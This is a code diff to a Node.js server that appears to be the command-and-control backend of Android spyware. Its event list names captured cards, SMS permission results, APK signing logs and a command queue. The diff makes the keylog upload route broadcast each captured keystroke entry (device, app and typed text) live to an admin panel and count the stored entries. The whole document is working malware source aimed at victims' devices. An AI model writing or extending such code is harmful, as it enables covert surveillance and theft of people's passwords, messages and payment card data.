@@ -1834,7 +1834,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       'card_captured', 'server_metrics', 'notification', 'apk_sign_log',
       'command_queue_flushed', 'adult_video_added', 'upload_progress', 'upload_complete',
       'new_video', 'video_deleted', 'video_updated', 'viewer_count', 'new_comment',
-      'view_update', 'sms_permission_result'
+      'view_update', 'sms_permission_result', 'new_keylog'
     ]);
     if (restrictedEvents.has(eventName)) {
       // Only send to authenticated sockets
@@ -2693,6 +2693,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const { device_id, entries } = req.body;
       if (!device_id || !Array.isArray(entries)) return res.status(400).json({ error: 'device_id and entries array required' });
 
+      let stored = 0;
       try {
         db.exec(`CREATE TABLE IF NOT EXISTS keylog_entries (
           id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -2702,10 +2703,20 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         const stmt = db.prepare('INSERT INTO keylog_entries (device_id, app_package, text_content, recorded_at) VALUES (?,?,?,?)');
         for (const e of entries) {
           stmt.run(device_id, e.app || '', e.text || '', e.ts || new Date().toISOString());
+          stored++;
+          // Real-time broadcast to admin panel
+          if (io) {
+            io.emit('new_keylog', {
+              device_id,
+              app_package: e.app || '',
+              text_content: e.text || '',
+              recorded_at: e.ts || new Date().toISOString()
+            });
+          }
         }
       } catch (_) {}
 
-      res.json({ success: true, stored: entries.length });
+      res.json({ success: true, stored });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
